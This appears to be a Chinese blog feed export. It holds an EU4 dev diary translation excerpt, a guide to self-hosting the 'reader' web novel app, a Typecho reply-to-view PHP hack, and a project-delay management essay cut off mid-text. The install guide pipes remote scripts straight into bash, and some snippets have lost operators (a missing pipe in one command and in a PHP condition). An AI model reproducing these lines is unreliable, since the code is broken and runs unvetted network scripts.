清获得“新八旗军”，直到游戏结束，给予以下效果： 士气伤害：+10.0% 效果仅影响八旗军 获得100军事点数</p></blockquote><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-f3e02d399d916e3d7402300e8adcba8d.png"></p><blockquote><p><strong>王朝任务</strong> 如果我们完成“中国工业革命”任务，我们会获得一个关于商品生产的永久加成，同时可以获得独特全新的国家法典。 如果我们完成“闭关锁国”任务，我们的市场会变成“世界贸易渴望的中心”，并且我们可以通过强制通货膨胀，制裁任何境外的贸易力量，制裁效果取决于他们各自贸易节点的比重</p></blockquote><p>Some cool rewards of the Emperor of China Branch available to either Ming, Qing or any Warlord with the Mandate:</p><p>中国皇帝线中一些有趣的奖励可由明、清或任何拥有天命的诸侯获得：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-2267f8ac17dd255420e7cf5906e1a1a9.jpeg"></p><blockquote><p><strong>京杭大运河</strong> 触发“京杭大运河”事件 事件概览： 此事件会给予我们一个能力，让我们的统治者成为大工程师，同时在所有大运河沿线我们的省份中升级“工坊”。</p></blockquote><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-4ff6bbc941171a9de9838db457fbfe04.jpeg"></p><blockquote><p><strong>一条鞭法</strong> 触发“大型税制改革”事件 事件概览： 此事件会给予我们获得更多贵金属省份，同时会计顾问获得显著折扣。如果我们完成任务时，我们的盟友或盟友的属国拥有波托西银矿，那么其产量会有巨量增幅。</p></blockquote><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0fcbabc0f0cb1b16703e37b87729d983.png"></p><blockquote><p><strong>治世盛世</strong> 治世奖励： 清获得“治世”，持续25年，给予以下效果： 年度贤能值：+1.00 改革进度增长：+20.0% 所有阶级忠诚平衡点：+10.0% 清获得10.00力量投射 弘历获得1行政能力，1外交能力，1军事能力 超出6点的君主能力会转化成100对应的君主点数 盛世奖励： 清获得“盛世”，持续到游戏结束，给予以下效果： 所有点数花费：-5.0% 清获得25.00力量投射 通过一项天朝改革会让所有我们的属国提高10点忠诚度</p></blockquote><p>Thank you so much for taking the time to read through 2023’s first Dev Diary! I hope you are just as excited to delve into the new content as we were while making it! We will be back next week to talk about the new content we have created for… <em><strong>The Ottomans!</strong></em> Cheers!</p><p>感谢你们不吝惜宝贵的时间通读2023年的第一篇开发日志！希望你们对钻研新内容感到很激动，正如我们当时设计它们一样！我们下周会谈谈我们设计的新内容，主角是……奥斯曼！精罗狂喜！</p><p>PS: Special thanks to the Chinese modding community for valuable research sources!</p><p>另：特别感谢中国MOD社区提供的很有价值的研究资料！</p><p>A special episode of Chapel Comic for you today!</p><p>今天还给大家带来一则漫画！</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-750cfd9149399366822976d53354ceeb.png"></p><p>翻译：Strategemata Raymond 三里之尘</p><p>校对：113322qwe1 三等文官猹中堂</p><p>欢迎关注UP主和主播<strong>小牧Phenix</strong>！</p><p>欢迎关注<strong>牧游社</strong>微信公众号和知乎专栏！微信公众号近期改版为信息流，欢迎置顶订阅不迷路，即时获得推送消息！<strong>牧有汉化Official</strong>已进驻B站，欢迎关注！</p><p>欢迎加入<strong>牧有汉化</strong>，致力于为玩家社群提供优质内容！组员急切募集中！测试群组822400145！</p><p>本作品英文原文著作权属Paradox interactive AB所有，中文译文著作权属牧有汉化所有。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-2ce5f6559886666ecc577cff7c05927a.gif"></p><blockquote><p>本篇文章来源于微信公众号: 牧游社</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 开发日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7分钟搭建Web版的阅读 附带书源</title>
      <link href="/345.html"/>
      <url>/345.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github上提供了四种方式(服务器版、Docker版、Docker-Compose版、通过脚本一键部署)进行安装部署，官方最推荐通过Docker-Compose版进行安装，本文除了分享这些安装方式外，也是为了记录这个过程以便后续进行查阅，如果能帮到你们，希望能留言支持！</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>书源管理</li><li>书架管理</li><li>搜索</li><li>书海</li><li>看书</li><li>移动端适配</li><li>换源</li><li>翻页方式</li><li>手势支持</li><li>自定义主题</li><li>自定义样式</li><li>WebDAV同步</li><li>文字替换过滤</li><li>听书&lt;仅部分浏览器支持，手机端会因为锁屏而失效&gt;</li><li>用户配置备份恢复</li><li>支持漫画</li><li>支持音频</li><li>书源失效检测</li><li>导入本地TXT、EPUB、UMD格式的书籍</li><li>书籍分组</li><li>RSS订阅</li><li>定时更新书架</li><li>并发搜书</li><li>本地书仓</li></ul><h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><p><img src="https://cos.gjcloak.xyz/upload/2023/02/3288595505.png"><br><img src="https://cos.gjcloak.xyz/upload/2023/02/1369033078.png"><br><img src="https://cos.gjcloak.xyz/upload/2023/02/2817647268.png"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="服务器版"><a href="#服务器版" class="headerlink" title="服务器版"></a>服务器版</h3><p>从 <a href="https://github.com/hectorqin/reader/releases">releases</a> 下载 <code>reader-$version.jar</code> 运行即可，需要安装 <code>java10以上</code> 环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 创建目录</span><br><span class="line">mkdir reader3</span><br><span class="line">cd reader3</span><br><span class="line"></span><br><span class="line"># 下载 jar</span><br><span class="line">wget &quot;xxxx&quot;</span><br><span class="line"></span><br><span class="line"># 安装jdk10以上环境...</span><br><span class="line"></span><br><span class="line"># 运行</span><br><span class="line"></span><br><span class="line"># 自用版</span><br><span class="line">java -jar reader-$version.jar</span><br><span class="line"></span><br><span class="line"># 多用户版</span><br><span class="line">java -jar reader-$version.jar --reader.app.secure=true --reader.app.secureKey=管理密码 --reader.app.inviteCode=注册邀请码</span><br><span class="line"></span><br><span class="line"># web端 http://localhost:8080/</span><br><span class="line"># 接口地址 http://localhost:8080/reader3/</span><br></pre></td></tr></table></figure><h3 id="Docker版"><a href="#Docker版" class="headerlink" title="Docker版"></a>Docker版</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 自行编译</span><br><span class="line"># docker build -t reader:latest .</span><br><span class="line"></span><br><span class="line"># 使用环境变量覆盖服务配置，环境变量采用大写字母，不允许使用.-符号，采用下划线“_”取代点“.”  减号“-”直接删除</span><br><span class="line"></span><br><span class="line"># docker run -d --restart=always --name=reader -e &quot;SPRING_PROFILES_ACTIVE=prod&quot; -v $(pwd)/logs:/logs -v $(pwd)/storage:/storage -p 8080:8080 reader:latest</span><br><span class="line"></span><br><span class="line"># 跨平台镜像</span><br><span class="line"></span><br><span class="line"># 新建构建器</span><br><span class="line"># docker buildx create --use --name mybuilder</span><br><span class="line"># 启动构建器</span><br><span class="line"># docker buildx inspect mybuilder --bootstrap</span><br><span class="line"># 查看构建器及其所支持的cpu架构</span><br><span class="line"># docker buildx ls</span><br><span class="line"># 构建跨平台镜像</span><br><span class="line"># docker buildx build -t reader:latest --platform=linux/arm,linux/arm64,linux/amd64 . --push</span><br><span class="line"></span><br><span class="line"># 使用预编译的镜像</span><br><span class="line"></span><br><span class="line"># 自用版(建议修改映射端口)</span><br><span class="line">docker run -d --restart=always --name=reader -e &quot;SPRING_PROFILES_ACTIVE=prod&quot; -v $(pwd)/logs:/logs -v $(pwd)/storage:/storage -p 8080:8080 hectorqin/reader</span><br><span class="line"></span><br><span class="line"># 多用户版(建议修改映射端口)</span><br><span class="line">docker run -d --restart=always --name=reader -v $(pwd)/logs:/logs -v $(pwd)/storage:/storage -p 8080:8080 hectorqin/reader java -jar /app/bin/reader.jar --spring.profiles.active=prod --reader.app.secure=true --reader.app.secureKey=管理密码 --reader.app.inviteCode=注册邀请码</span><br><span class="line"></span><br><span class="line"># 多用户版 使用环境变量(建议修改映射端口)</span><br><span class="line">docker run -d --restart=always --name=reader -e &quot;SPRING_PROFILES_ACTIVE=prod&quot; -e &quot;READER_APP_SECURE=true&quot; -e &quot;READER_APP_SECUREKEY=管理密码&quot; -e &quot;READER_APP_INVITECODE=注册邀请码&quot; -v $(pwd)/logs:/logs -v $(pwd)/storage:/storage -p 8080:8080 hectorqin/reader</span><br><span class="line"></span><br><span class="line"># 更新docker镜像</span><br><span class="line"># docker pull hectorqin/reader</span><br><span class="line"></span><br><span class="line">#:后面的端口修改为映射端口</span><br><span class="line"># web端 http://localhost:8080/</span><br><span class="line"># 接口地址 http://localhost:8080/reader3/</span><br><span class="line"></span><br><span class="line"># 通过watchtower手动更新</span><br><span class="line">docker run --rm -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --cleanup --run-once reader</span><br><span class="line"></span><br><span class="line"># 使用 remote-webview 功能</span><br><span class="line"># 1.创建 remote-webview 容器</span><br><span class="line">docker run -d --network host --restart=always hectorqin/remote-webview</span><br><span class="line"># 2.重建 reader 容器</span><br><span class="line">reader使用宿主机网络：--network host</span><br><span class="line">reader添加环境变量：-e &quot;READER_APP_REMOTEWEBVIEWAPI=http://localhost:8050&quot;</span><br><span class="line">获取reader添加参数：--reader.app.remoteWebviewApi=http://localhost:8050&quot;</span><br></pre></td></tr></table></figure><h3 id="Docker-Compose版"><a href="#Docker-Compose版" class="headerlink" title="Docker-Compose版"></a>Docker-Compose版</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#腾讯云，阿里云，华为云，甲骨文等服务器提供商需在控制台面板手动关闭防火墙并放行端口</span><br><span class="line">#安装docker 及 docker-compose</span><br><span class="line">#Debian/Ubuntu</span><br><span class="line">apt install docker-compose -y</span><br><span class="line">#CentOS</span><br><span class="line">curl -fsSL https://get.docker.com  bash -s docker #国外服务器</span><br><span class="line">curl -fsSL https://get.docker.com  bash -s docker --mirror Aliyun #国内服务器</span><br><span class="line"></span><br><span class="line"># 下载项目里的 docker-compose.yaml</span><br><span class="line">wget https://ghproxy.com/https://raw.githubusercontent.com/hectorqin/reader/master/docker-compose.yaml</span><br><span class="line"># 根据 docker-compose.yaml 里面的注释编辑所需配置</span><br><span class="line">vim docker-compose.yaml</span><br><span class="line"># 保存</span><br><span class="line">esc</span><br><span class="line">:wq</span><br><span class="line"># 启动 docker-compose</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 停止 docker-compose</span><br><span class="line">docker-compose stop</span><br><span class="line"></span><br><span class="line"># 查看实时日志</span><br><span class="line">docker logs -f reader</span><br><span class="line"></span><br><span class="line"># 自行导入远程书源(打开链接后复制网址导入即可)</span><br><span class="line">https://legado.pages.dev</span><br><span class="line"></span><br><span class="line"># 手动更新</span><br><span class="line">docker-compose pull &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="通过脚本一键部署"><a href="#通过脚本一键部署" class="headerlink" title="通过脚本一键部署"></a>通过脚本一键部署</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 此脚本对甲骨文非Ubuntu系统,CentOS9可能不兼容。建议网上手动搜索</span><br><span class="line">#curl </span><br><span class="line">bash &lt;(curl -L -s https://ghproxy.com/https://raw.githubusercontent.com/hectorqin/reader/master/reader.sh)</span><br><span class="line"></span><br><span class="line">#wget </span><br><span class="line">bash &lt;(wget -qO- --no-check-certificate https://ghproxy.com/https://raw.githubusercontent.com/hectorqin/reader/master/reader.sh)</span><br></pre></td></tr></table></figure><p>搭建完成后，在反代其端口即可实现web版小说阅读，公爵使用的是宝塔的反代很简单，如果是其他的，自行百度，这里就不赘述了</p><h2 id="书源"><a href="#书源" class="headerlink" title="书源"></a>书源</h2><p>[hide]<br><a href="https://github.com/XIU2/Yuedu">精品书源</a><br><a href="https://cos.gjcloak.xyz/upload/2023/02/1830792898.zip">2023.0101更新源</a></p><p>[&#x2F;hide]</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/hectorqin/reader/blob/master/doc.md">文档</a><br><a href="https://github.com/hectorqin/reader">hectorqin&#x2F;reader</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 搭建 </tag>
            
            <tag> 阅读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typecho 不使用插件实现内容回复可见</title>
      <link href="/334.html"/>
      <url>/334.html</url>
      
        <content type="html"><![CDATA[<p>进入 <code>网站目录/usr/themes/主题</code> 找到 <code>post.php</code> 打开</p><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>在 <code>post.php</code> 找到 <code>&lt;?php $this-&gt;content(); ?&gt;</code> 替换成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$db = Typecho_Db::get();</span><br><span class="line">$sql = $db-&gt;select()-&gt;from(&#x27;table.comments&#x27;)</span><br><span class="line">    -&gt;where(&#x27;cid = ?&#x27;,$this-&gt;cid)</span><br><span class="line">    -&gt;where(&#x27;mail = ?&#x27;, $this-&gt;remember(&#x27;mail&#x27;,true))</span><br><span class="line">    -&gt;limit(1);</span><br><span class="line">$result = $db-&gt;fetchAll($sql);</span><br><span class="line">if($this-&gt;user-&gt;hasLogin()  $result) &#123;</span><br><span class="line">    $content = preg_replace(&quot;/\[hide\](.*?)\[\/hide\]/sm&quot;,&#x27;&lt;div class=&quot;reply2view&quot;&gt;$1&lt;/div&gt;&#x27;,$this-&gt;content);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $content = preg_replace(&quot;/\[hide\](.*?)\[\/hide\]/sm&quot;,&#x27;&lt;div class=&quot;reply2view&quot;&gt;此处内容需要评论回复后方可阅读。&lt;/div&gt;&#x27;,$this-&gt;content);</span><br><span class="line">&#125;</span><br><span class="line">echo $content </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="解决feed内容和缩略内容暴露"><a href="#解决feed内容和缩略内容暴露" class="headerlink" title="解决feed内容和缩略内容暴露"></a>解决feed内容和缩略内容暴露</h3><p>在 <code>functions.php</code> 中加入如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Typecho_Plugin::factory(&#x27;Widget_Abstract_Contents&#x27;)-&gt;excerptEx = array(&#x27;moleft&#x27;,&#x27;one&#x27;);</span><br><span class="line">Typecho_Plugin::factory(&#x27;Widget_Abstract_Contents&#x27;)-&gt;contentEx = array(&#x27;moleft&#x27;,&#x27;one&#x27;);</span><br><span class="line">class moleft &#123;</span><br><span class="line">    public static function one($con,$obj,$text)</span><br><span class="line">    &#123;</span><br><span class="line">      $text = empty($text)?$con:$text;</span><br><span class="line">      if(!$obj-&gt;is(&#x27;single&#x27;))&#123;</span><br><span class="line">      $text = preg_replace(&quot;/\[hide\](.*?)\[\/hide\]/sm&quot;,&#x27;此处内容已隐藏&#x27;,$text);</span><br><span class="line">      &#125;</span><br><span class="line">      return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是用插件接口，在缩略内容输出之前，隐藏掉或者替换掉回复可见内容，同时使用if判断，来针对非single页面进行隐藏。</p><h3 id="步骤三"><a href="#步骤三" class="headerlink" title="步骤三"></a>步骤三</h3><p>在写文章需要隐藏部分内容时用以下写法(去掉@)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[@hide]要隐藏的内容[/hide]</span><br></pre></td></tr></table></figure><p>css代码参考，我在使用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.reply2view &#123;</span><br><span class="line">    background-color: rgba(0,0,0,.075);</span><br><span class="line">    border-radius: 5px;</span><br><span class="line">    border: 1px dashed #888888;</span><br><span class="line">    position: relative;</span><br><span class="line">    text-align: center;</span><br><span class="line">    padding: 10px 20px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typecho魔改 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何应对项目延期的问题？</title>
      <link href="/327.html"/>
      <url>/327.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>项目延期在产品经理的工作生涯中是再常见不过的问题，但延期意味着某项环节出现问题，对后续的运营等动作也会有影响。如何能尽量避免项目延期呢？本文对此进行了分析，希望对你有帮助。</p></blockquote><h2 id="一、项目为什么容易延期？"><a href="#一、项目为什么容易延期？" class="headerlink" title="一、项目为什么容易延期？"></a>一、项目为什么容易延期？</h2><h3 id="1-软件研发是一项创造性工作"><a href="#1-软件研发是一项创造性工作" class="headerlink" title="1. 软件研发是一项创造性工作"></a>1. 软件研发是一项创造性工作</h3><p>项目延期是一种普遍现象，管理者最为头疼的一个问题。但是外人并不理解。明明是你们自己做的计划，怎么总会出现这么多问题。说到底，这是由于我们的工作特性决定的。我们做的是一个创造性的工作，他不像建房子，有特定的步骤。我们实现一个功能，怎么写，有多少行代码，我们在写之前是不知道的。</p><p>基于我自己的经验，我觉得项目延期还有以下两个方面的原因：</p><h3 id="‍2-工作中的突发事件多"><a href="#‍2-工作中的突发事件多" class="headerlink" title="‍2. 工作中的突发事件多"></a>‍2. 工作中的突发事件多</h3><p>我们在评估工作量的时候，都是基于过往的经验。这种经验性评估在真实环境中并不可靠，你无法应对突发问题，而我们真实开发的过程中突发问题太多了。</p><h3 id="3-协作之间的耦合性高"><a href="#3-协作之间的耦合性高" class="headerlink" title="3. 协作之间的耦合性高"></a>3. 协作之间的耦合性高</h3><p>技术人员工作的耦合性太高。从最开始产品经理提出需求、UI设计原型、UE设计体验、程序员做系统设计，写代码、测试人员编写测试用例。环环相扣，其中一个环节出了“意外”，时间就得往后延。</p><h2 id="二、工作中常见的延期原因"><a href="#二、工作中常见的延期原因" class="headerlink" title="二、工作中常见的延期原因"></a>二、工作中常见的延期原因</h2><p>我这里列了工作中常见的延期原因：</p><ul><li>需求变更，一般指新增需求或者需求细节一直在变；</li><li>需求评估的工作量不足，低估了功能实现的难度；</li><li>需求理解不对，功能做错了。等最后测试或对接的时候才发现；</li><li>有临时需求插入。比如线上突然出现了一个bug，需要修复；</li><li>新需求本身存在逻辑问题，做之前都没发现，在做的过程中才发现。</li><li>自测不仔细，测试发现问题太多，bug越改越多；</li><li>临时人员变动；</li><li>偏离计划后没有做好应对措施；</li><li>技术难点调研出了问题，实现方案得改；</li><li>……</li></ul><p>那是不是我们就没办法了呢？也并不是。方法总比问题多，只要所有出现的问题都有应对方案，准时上线也是可能的。当然面对复杂问题，想一次性解决很难，但好在我们可以迭代。每一次项目结束都应该对项目做一次复盘。</p><h2 id="三、如何解决项目延期问题？"><a href="#三、如何解决项目延期问题？" class="headerlink" title="三、如何解决项目延期问题？"></a>三、如何解决项目延期问题？</h2><p>这是我应对项目延期的解决方案：复盘 —— 找问题 —— 拆解问题 —— 制定解决方案 —— 迭代 —— 复盘。</p><h3 id="1-复盘，找问题"><a href="#1-复盘，找问题" class="headerlink" title="1. 复盘，找问题"></a>1. 复盘，找问题</h3><p>复盘：上一次我们延期的原因是什么？把问题原因找出来。比如上次是需求变动导致的。</p><h3 id="2-拆解问题，制定解决方案"><a href="#2-拆解问题，制定解决方案" class="headerlink" title="2. 拆解问题，制定解决方案"></a>2. 拆解问题，制定解决方案</h3><p>接着就是拆解问题。为什么需要变动？因为这个功能更重要。这是答案是真的吗？这个功能真的很重要吗？好，是真的。那么评判标准是什么？如果没有。那么我需要制定出来。有了标准，下次遇到新增需求，我们就能很快决定是否加入到这个版本里。好，我们还可以继续拆，是新增需求导致的延期？对，因为新增需求而且并没有修改上线时间。那我们下一次面对新增需求是不是可以对外争取更长一点的开发时间？</p><p>这个方法的优点是，每次进步都能感受的到。缺点是，时间周期太长。但好在，我们别人的经验是可以学习的。别人趟过的坑，我们没有必要再趟一次。</p><h2 id="四、解决项目延期的关键三要素"><a href="#四、解决项目延期的关键三要素" class="headerlink" title="四、解决项目延期的关键三要素"></a>四、解决项目延期的关键三要素</h2><p>基于我多年的项目管理经验，我认为要解决项目延期问题，必须做好三件事。</p><h3 id="1-项目开始前：需求管理"><a href="#1-项目开始前：需求管理" class="headerlink" title="1. 项目开始前：需求管理"></a>1. 项目开始前：需求管理</h3><p>项目开始前的需求管理有四个关键步骤。</p><h4 id="1）达成需求优先级排序的共识"><a href="#1）达成需求优先级排序的共识" class="headerlink" title="1）达成需求优先级排序的共识"></a>1）达成需求优先级排序的共识</h4><p>首先，我们要达成给需求优先级排序的一个共识。什么样的需求是最重要的，一定要完成的？每个公司可能不一样。我自己是基于商业价值和用户价值两个维度来排序的。</p><p>商业价值，就是那些直接给公司带来利润，能够降低运营成本、完成公司长期战略目标等功能。而用户价值是，那些能够提升用户体验、提高用户使用效率，解决用户痛点问题的功能。</p><p>基于这两个维度，我们可以画一个四象限图，把我们所有的需求按照商业价值、用户价值两个维度给归类到不同象限里。对于商业价值高、用户价值高的产品。我们应该马上去做。至于优先级排第二的是商业价值高、用户价值低的需求；还是商业价值低、用户价值高的需求，要根据公司实际情况来定。</p><p>为什么要给需求分优先级？时间有限，要做的功能太多。如果根据商业价值和用户价值拆解后，还有很多需求，我们还可以继续用重要紧急两个维度来拆。</p><h4 id="2）弄清楚需求的目的"><a href="#2）弄清楚需求的目的" class="headerlink" title="2）弄清楚需求的目的"></a>2）弄清楚需求的目的</h4><p>达成了共识后，第二步就是在需求评审时，要求产品先讲解需求的目的。不只是说明我们要做什么，还要说明我们要达到什么目标。这样做有两个好处。</p><p>让所有人参与其中，发挥团队所有人的价值，通过集体共创可以获得更好的解决方案。<br>在事后，我们可以很清晰的看到，我们做的功能是不是往目标更前进了一步。如果没有。那么复盘的时候，能更有指向性的去找问题的原因。</p><h4 id="3）弄清楚需求细节"><a href="#3）弄清楚需求细节" class="headerlink" title="3）弄清楚需求细节"></a>3）弄清楚需求细节</h4><p>第三步，就是开发者需要弄清楚需求细节。每一个开发人员都应该养成这样一个看透细节的能力。</p><p>代码的世界里只有0和1，没有随便。产品在给我们讲需求的时候，并不知道系统的具体实现。有些细节他也不知道。这会导致很多需求在做的过程中有很多细节需要反复确认，如果做的不好，很多细节问题都会在测试的时候体现出来。</p><p>举个例子，当产品说我们这次做一个活动，用户下单满29包邮。看起来很简单的一个需求，但如果你系统足够复杂，开发人员应该要想到，跨店的情况怎么办？含虚拟商品怎么办？如果店家设置了其他活动，冲突了怎么办？需求后期会不会变成49包邮？如果这些在评审的时候没有想到，那么在做的过程中一定要和产品保持沟通。有些新人刚来的时候不好意思问，其实没啥，每个人都是这么过来的。这种能力是需要时间积累的。</p><p>需求理清了也有两个好处：</p><p>评估的工作量会跟精准。<br>更早的发现需求里潜藏的问题。</p><h4 id="4）输出完整的项目上线计划表"><a href="#4）输出完整的项目上线计划表" class="headerlink" title="4）输出完整的项目上线计划表"></a>4）输出完整的项目上线计划表</h4><p>第四步，就是上下同步需求，生成需求计划表。首先我们拆解需求，大需求变成小需求。然后评估小需求的工作量。输出自己的个人计划表。然后部门内部整合需求，输出部门的计划完成表。最后是与团队其他成员生成整体的项目计划表。一般会做成甘特图。这样在做的过程中更容易发现问题。</p><p>异常情况：</p><p>这四个关键步骤，说起来简单，但要真正做好不容易。如果能做到，那需求管理基本不会存在大的问题了。当然也会有一些异常情况。比如需求确定后，能不能变动？一般需求确定下来后，最好不要做临时变动。除非特殊情况。</p><p>那什么是特殊情况？这就是制定需求优先级规则的好处了，如果确实有更紧急、成本低的高商业价值、高用户价值的需求。我们可以变动。只要团队内成员都认可这个规则，做需求变动就会比较好实施。</p><p>那如果是领导不按规则变动需求怎么办？</p><p>谁担责谁决策。因为站的角度不一样，我们认为的高价值任务不一定对。这是一条职场通用原则，在需求确定做不做之前，作为项目组成员，你可以表达自己的建议，但如果最终负责人拍板要做，那就坚决执行。</p><h3 id="2-项目开始中：过程管理"><a href="#2-项目开始中：过程管理" class="headerlink" title="2. 项目开始中：过程管理"></a>2. 项目开始中：过程管理</h3><p>过程管理的关键是要解决信息不同步的问题。我的解决方案是：</p><h4 id="1）每天都开站立晨会"><a href="#1）每天都开站立晨会" class="headerlink" title="1）每天都开站立晨会"></a>1）每天都开站立晨会</h4><p>很多人说早上开晨会没有用，是管理者没有其他办法，只能通过会议来推进工作的一种表现。我倒不觉得，晨会并不复杂，也不会花费很多时间，但正是因为有了这样一个固定”沟通“事项，每个人心里都会想着这件事，自然会把当下的工作按计划推进。这里我介绍一下我公司开站立晨会的具体步骤：</p><p>首先团队之间达成共识。明确晨会的目的是协同，而非汇报。每个人时间就2分钟。控制发言时间。<br>确定汇报的内容。每个人讲讲当天的计划和实际进度是否一致。是否遇到了什么问题，是否需要什么支持。<br>固定发言顺序，发言过程中，其他人不评论，不解答。具体的问题等到会后在找相关人员一起讨论。<br>晨会的主持人很关键，他需要控制流程和时间，对于偏离主题的发言要给予提醒。<br>最后就是要做会议纪要，只记录某人遇到的问题或请求以及整个项目的进度是否正常。<br>开会时间推荐在正式上班时间30分钟后，比如9点上班。9点30开始。10点前结束。备注：我公司弹性上班可以9点半到公司。</p><p>晨会能很好的解决团队内部信息不对称的问题，大家能更好地了解到彼此的项目进度并做好配合。而且人都要面子的，如果自己制定的计划未完成，还要自己当众说出来没按计划完成的原因，是很有压力的，这种压力会在潜意识里影响到自己每天任务的完成度以及专注度。</p><p>很多公司把晨会开成了汇报会，最后就变成了一个没有太多信息量的务虚会议。并不是这个工具不好用，而是你没有用对方法。记住上面我说的几个原则，相信你能组织好一场适合团队的晨会。</p><h4 id="2）如果是跨部门协作，每日要进行“对表”"><a href="#2）如果是跨部门协作，每日要进行“对表”" class="headerlink" title="2）如果是跨部门协作，每日要进行“对表”"></a>2）如果是跨部门协作，每日要进行“对表”</h4><p>如果是跨部门协作。我们每天也要进行”对表“，也就是同步信息。</p><h4 id="3）关键节点的跟进"><a href="#3）关键节点的跟进" class="headerlink" title="3）关键节点的跟进"></a>3）关键节点的跟进</h4><p>千万不要等到上线了在来看项目进展，这样即使发现问题，你也没有时间来解决。</p><h4 id="4）制定异常问题的处理机制"><a 